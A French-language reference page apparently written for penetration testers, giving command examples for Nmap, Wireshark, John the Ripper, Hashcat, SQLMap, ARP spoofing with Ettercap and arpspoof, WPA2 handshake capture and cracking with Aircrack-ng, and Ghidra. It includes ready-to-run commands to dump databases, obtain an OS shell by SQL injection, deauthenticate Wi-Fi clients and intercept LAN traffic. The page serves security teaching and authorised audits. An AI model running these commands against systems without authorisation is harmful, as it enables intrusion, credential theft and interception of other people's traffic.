---
tags:
  - redteam
  - nmap
  - wifi
  - cracking
---

# Outils de Sécurité Essentiels

La boîte à outils du hacker—outils essentiels pour les tests de pénétration et l'audit de sécurité.

---

!!! danger "Avertissement Légal"
    Ces outils sont pour **usage éducatif** ou **audits de sécurité autorisés UNIQUEMENT**.

    Les utiliser sur des réseaux, systèmes ou applications que vous ne possédez pas ou pour lesquels vous n'avez pas d'autorisation écrite explicite est **illégal** et peut entraîner des poursuites pénales.

    **Obtenez toujours une autorisation écrite avant de tester.**

---

## Catégorie 1 : Reconnaissance Réseau

### Nmap — "Le Mappeur"

Le scanner réseau standard de l'industrie. Découvre les hôtes, ports ouverts, services et versions d'OS.

```bash
# Scan basique
nmap 192.168.1.1

# Détection de version de service
nmap -sV 192.168.1.1

# Détection OS + scripts + version
nmap -A 192.168.1.1

# Scan complet des ports TCP
nmap -p- 192.168.1.1

# Scan SYN furtif (nécessite root)
sudo nmap -sS 192.168.1.1

# Scan UDP (lent mais important)
sudo nmap -sU --top-ports 100 192.168.1.1

# Scanner un sous-réseau entier
nmap 192.168.1.0/24

# Sortie vers tous les formats
nmap -oA scan_results 192.168.1.1
```

**Scripts Courants (NSE) :**

```bash
# Scan de vulnérabilités
nmap --script vuln 192.168.1.1

# Énumération SMB
nmap --script smb-enum-shares 192.168.1.1

# Énumération HTTP
nmap --script http-enum 192.168.1.1
```

| Flag | Objectif |
|------|---------|
| `-sS` | Scan furtif SYN |
| `-sV` | Détection de version |
| `-sC` | Scripts par défaut |
| `-O` | Détection OS |
| `-A` | Agressif (OS + version + scripts + traceroute) |
| `-p-` | Tous les 65535 ports |
| `-Pn` | Ignorer la découverte d'hôte (supposer en ligne) |
| `-T4` | Timing plus rapide |

---

### Wireshark — "Le Microscope"

Inspection et analyse approfondie des paquets. Voir exactement ce qui passe sur le câble.

**Cas d'Usage :**

- Analyser le trafic réseau suspect
- Déboguer les protocoles d'application
- Capturer les identifiants sur protocoles non chiffrés
- Investiguer la communication de malware

**Filtres Courants :**

```text
# Filtrer par IP
ip.addr == 192.168.1.100

# Filtrer par protocole
http
dns
tcp.port == 443

# Filtrer les requêtes HTTP
http.request.method == "POST"

# Trouver des mots de passe (non chiffrés)
http contains "password"

# Problèmes de handshake TCP
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Suivre le flux TCP
Clic droit sur paquet → Follow → TCP Stream
```

**Capture Rapide :**

```bash
# Capture CLI avec tshark
tshark -i eth0 -w capture.pcap

# Capturer un port spécifique
tshark -i eth0 -f "port 80" -w http_traffic.pcap
```

---

## Catégorie 2 : Cassage de Mots de Passe (Offline)

### Comprendre : Hachage vs Chiffrement

| Concept | Hachage | Chiffrement |
|---------|---------|------------|
| **Direction** | Sens unique (irréversible) | Bidirectionnel (réversible) |
| **Objectif** | Vérifier l'intégrité | Protéger la confidentialité |
| **Clé requise** | Non | Oui |
| **Exemple** | SHA256, bcrypt, MD5 | AES, RSA, ChaCha20 |

**Cassage de mot de passe** = Étant donné un hash, trouver le mot de passe original en essayant des millions de possibilités.

---

### John the Ripper

Casseur de mots de passe rapide et polyvalent supportant plus de 100 formats de hash.

```bash
# Identifier le type de hash
john --list=formats | grep -i sha

# Casser avec wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Casser avec règles (mutations)
john --wordlist=rockyou.txt --rules=best64 hashes.txt

# Afficher les mots de passe cassés
john --show hashes.txt

# Format spécifique
john --format=raw-sha256 hashes.txt
```

**Formats supportés :**

- Linux shadow (`/etc/shadow`)
- Windows NTLM
- Mots de passe ZIP/RAR
- Documents Office
- Clés SSH
- Et bien d'autres...

---

### Hashcat — Cassage Accéléré par GPU

Plus rapide que John en utilisant la puissance du GPU. Essentiel pour le cassage à grande échelle.

```bash
# Attaque par dictionnaire basique
hashcat -m 0 -a 0 hash.txt rockyou.txt

# Avec règles
hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule

# Brute-force (attaque par masque)
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# Afficher les résultats
hashcat --show hash.txt
```

**Modes de Hash Courants (-m) :**

| Mode | Type de Hash |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1000 | NTLM (Windows) |
| 1800 | SHA512crypt (Linux) |
| 3200 | bcrypt |
| 13100 | Kerberos TGS |

**Caractères de Masque :**

| Masque | Caractères |
|------|------------|
| `?l` | Minuscules (a-z) |
| `?u` | Majuscules (A-Z) |
| `?d` | Chiffres (0-9) |
| `?s` | Caractères spéciaux |
| `?a` | Tous imprimables |

---

## Catégorie 3 : Web & Base de Données

### SQLMap — Automatisation d'Injection SQL

Automatise la détection et l'exploitation des vulnérabilités d'injection SQL.

!!! warning "Très Bruyant"
    SQLMap génère des centaines de requêtes. **Ne jamais utiliser sur des systèmes de production sans autorisation.** Il déclenchera toutes les alarmes WAF et IDS.

```bash
# Test basique
sqlmap -u "http://target.com/page?id=1"

# Requête POST
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Avec cookie/session
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123"

# Dumper la base de données
sqlmap -u "http://target.com/page?id=1" --dump

# Obtenir un shell (si possible)
sqlmap -u "http://target.com/page?id=1" --os-shell

# Spécifier le type de base de données
sqlmap -u "http://target.com/page?id=1" --dbms=mysql
```

**Flags Utiles :**

| Flag | Objectif |
|------|---------|
| `--dbs` | Lister les bases de données |
| `--tables` | Lister les tables |
| `--columns` | Lister les colonnes |
| `--dump` | Dumper les données |
| `--level=5` | Niveau de test maximum |
| `--risk=3` | Risque maximum (plus de tests) |
| `--batch` | Mode non-interactif |

---

## Catégorie 4 : Man-in-the-Middle (MitM)

### Ettercap — ARP Spoofing

Intercepter le trafic sur un LAN en empoisonnant les tables ARP.

**Comment fonctionne l'ARP Spoofing :**

```text
Normal :
Victime → Switch → Passerelle → Internet

Après Empoisonnement ARP :
Victime → Switch → [Attaquant] → Passerelle → Internet
         ↑
    L'attaquant dit à la victime :
    "Je suis la passerelle"
```

```bash
# Mode GUI
sudo ettercap -G

# Mode texte - Empoisonnement ARP sur tout le sous-réseau
sudo ettercap -T -q -i eth0 -M arp:remote //192.168.1.1// //192.168.1.0/24//

# Cibler un hôte spécifique
sudo ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
```

**Alternative : arpspoof + mitmproxy**

```bash
# Activer le forwarding IP
echo 1 > /proc/sys/net/ipv4/ip_forward

# ARP spoof dans les deux directions
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &

# Intercepter avec mitmproxy
mitmproxy --mode transparent
```

!!! danger "Détection"
    L'ARP spoofing est facilement détecté par :

    - Entrées ARP statiques
    - Outils de monitoring ARP (arpwatch)
    - Switches d'entreprise avec DAI (Dynamic ARP Inspection)

---

## Catégorie 5 : Audit Sans Fil

### Suite Aircrack-ng

Toolkit complet pour l'évaluation de sécurité WiFi.

**Composants :**

| Outil | Objectif |
|------|---------|
| `airmon-ng` | Activer le mode monitor |
| `airodump-ng` | Capturer les paquets, trouver les réseaux |
| `aireplay-ng` | Injecter des paquets, deauth clients |
| `aircrack-ng` | Casser les handshakes capturés |

**Workflow de Cassage WPA2 :**

```bash
# 1. Activer le mode monitor
sudo airmon-ng start wlan0

# 2. Scanner les réseaux
sudo airodump-ng wlan0mon

# 3. Cibler un réseau spécifique (capturer le handshake)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 4. Deauth client pour forcer la reconnexion (dans un nouveau terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 5. Attendre le message "WPA handshake" dans airodump

# 6. Casser avec wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# 7. Désactiver le mode monitor quand terminé
sudo airmon-ng stop wlan0mon
```

!!! tip "Cassage Plus Rapide"
    Convertir la capture au format hashcat pour l'accélération GPU :

    ```bash
    # Convertir en hccapx
    cap2hccapx capture-01.cap capture.hccapx

    # Casser avec hashcat
    hashcat -m 22000 capture.hccapx rockyou.txt
    ```

---

## Catégorie 6 : Rétro-Ingénierie

### Ghidra — Le Désassembleur de la NSA

Outil gratuit et open-source de rétro-ingénierie. Transforme les binaires compilés en pseudo-code lisible.

**Fonctionnalités :**

- Désassemblage (binaire → assembleur)
- Décompilation (binaire → pseudo-code C-like)
- Références croisées
- Graphes de fonctions
- Scripting (Python/Java)

**Installation :**

```bash
# Télécharger depuis https://ghidra-sre.org/ (recommandé)

# Ou via gestionnaire de paquets
sudo apt install ghidra  # Kali/Debian/Ubuntu
# Sur RHEL/Rocky : télécharger manuellement depuis le site officiel

# Exécuter
ghidraRun
```

**Workflow :**

1. Créer un nouveau projet
2. Importer le binaire (File → Import)
3. Double-cliquer pour ouvrir dans CodeBrowser
4. Auto-analyser quand demandé
5. Naviguer les fonctions dans le panneau gauche
6. Appuyer sur `F` sur les adresses pour créer des fonctions
7. Renommer variables/fonctions pour plus de clarté

**Raccourcis Clavier :**

| Touche | Action |
|-----|--------|
| `G` | Aller à l'adresse |
| `L` | Renommer/étiqueter |
| `T` | Retyper une variable |
| `;` | Ajouter un commentaire |
| `X` | Afficher les références croisées |
| `Ctrl+E` | Éditer les octets |

---

## Tableau de Référence Rapide

| Catégorie | Outil | One-liner |
|----------|------|-----------|
| Scan de Ports | Nmap | `nmap -sCV -oA scan target` |
| Analyse de Paquets | Wireshark | GUI ou `tshark -i eth0` |
| Cassage de Hash | John | `john --wordlist=rockyou.txt hash.txt` |
| Cassage de Hash (GPU) | Hashcat | `hashcat -m 0 -a 0 hash.txt rockyou.txt` |
| Injection SQL | SQLMap | `sqlmap -u "url?id=1" --dump` |
| ARP Spoofing | Ettercap | `ettercap -T -M arp:remote ///` |
| Audit WiFi | Aircrack-ng | `aircrack-ng -w wordlist capture.cap` |
| Rétro-Ingénierie | Ghidra | Analyse basée sur GUI |
